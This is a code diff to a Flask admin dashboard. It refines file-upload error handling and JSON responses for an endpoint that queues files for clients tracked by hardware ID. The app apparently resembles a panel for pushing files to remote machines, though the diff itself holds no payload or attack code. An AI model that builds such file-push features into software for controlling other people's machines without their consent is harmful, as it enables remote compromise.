@@ -69,6 +69,7 @@ DASHBOARD_HTML = """
         .file-upload input[type="file"] { display: none; }
         .file-upload label { background: #9b59b6; color: white; padding: 4px 10px; border-radius: 3px; cursor: pointer; }
         .file-upload label:hover { background: #8e44ad; }
+        .status-msg { margin-left: 10px; font-size: 12px; }
         .timestamp { color: #888; font-size: 0.8em; }
         .log-hwid { font-family: monospace; }
         .username-list { font-weight: bold; color: #0f0; }
@@ -84,24 +85,28 @@ DASHBOARD_HTML = """
             const fileInput = document.getElementById('fileInput_' + hwid);
             const file = fileInput.files[0];
             if (!file) {
-                alert('Please select a file.');
+                alert('Please select a file first.');
                 return;
             }
             const reader = new FileReader();
             reader.onload = function(e) {
-                const content = e.target.result; // base64
+                const content = e.target.result; // data URL
+                const base64Content = content.split(',')[1];
                 fetch('/admin/upload_file', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ hwid: hwid, filename: file.name, content_b64: content.split(',')[1] })
-                }).then(res => {
-                    if (res.status === 204) {
-                        alert('File sent successfully.');
+                    body: JSON.stringify({ hwid: hwid, filename: file.name, content_b64: base64Content })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status === 'ok') {
+                        alert('File sent successfully!');
                         fileInput.value = '';
                     } else {
-                        alert('Failed to send file.');
+                        alert('Error: ' + data.error);
                     }
-                }).catch(err => alert('Error: ' + err));
+                })
+                .catch(err => alert('Network error: ' + err));
             };
             reader.readAsDataURL(file);
         }
@@ -356,12 +361,12 @@ def upload_file():
     filename = data.get('filename')
     content_b64 = data.get('content_b64')
     if not hwid or not filename or not content_b64:
-        return jsonify({'error': 'missing fields'}), 400
+        return jsonify({'status': 'error', 'error': 'Missing fields'}), 400
     if hwid not in PLAYERS:
-        return jsonify({'error': 'hwid not found'}), 404
+        return jsonify({'status': 'error', 'error': 'HWID not found'}), 404
     PENDING_FILES[hwid] = {'filename': filename, 'content_b64': content_b64}
     print(f"[+] File queued for {hwid}: {filename}")
-    return '', 204
+    return jsonify({'status': 'ok'}), 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=False)
